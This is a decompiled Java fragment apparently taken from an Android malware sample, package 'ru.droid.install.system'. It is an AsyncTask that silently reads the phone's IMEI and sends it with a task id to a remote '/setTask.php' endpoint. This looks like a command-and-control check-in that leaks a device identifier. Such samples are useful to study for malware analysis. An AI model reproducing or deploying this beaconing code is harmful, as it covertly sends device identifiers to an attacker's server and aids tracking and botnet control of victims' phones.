	private synthetic ru.droid.install.system.ServiceController a
	
	    c(ru.droid.install.system.ServiceController p1)
	    {
	        this.a = p1;
	        return;
	    }
	
	
	    private varargs String a(String[] p11)
	    {
	        try {
	            String v4_0 = ((android.telephony.TelephonyManager) this.a.a.getSystemService("phone")).getDeviceId();
	            org.apache.http.impl.client.DefaultHttpClient v7_1 = new org.apache.http.impl.client.DefaultHttpClient();
	            try {
	                String v0_6 = new java.net.URI("http", ru.droid.install.system.AndroidService.b, "/setTask.php", new StringBuilder().append("id=").append(p11[0]).append("&imei=").append(v4_0).toString(), 0).toASCIIString();
	            } catch (String v0_7) {
	                v0_7.printStackTrace();
	                v0_6 = "";
	            }
	            String v0_10 = v7_1.execute(new org.apache.http.client.methods.HttpGet(v0_6)).getEntity().getContent();
	            java.io.BufferedReader v1_5 = new java.io.BufferedReader(new java.io.InputStreamReader(v0_10, "utf-8"), 8);
	            StringBuilder v2_4 = new StringBuilder();
	            while(true) {
	                String v3_3 = v1_5.readLine();
	                if (v3_3 == null) {
	                    break;
	                }
	                v2_4.append(v3_3);
	            }
	            v2_4.toString();
	            v0_10.close();
	            v1_5.close();
	            return 0;
	        } catch (String v0_11) {
	            v0_11.printStackTrace();
	            return 0;
	        }
	    }
	
	
	    protected final bridge synthetic Object doInBackground(Object[] p2)
	    {
	        return this.a(((String[]) p2));
	    }
	
	
	    protected final bridge synthetic void onPostExecute(Object p1)
	    {
	        return;
	    }
	
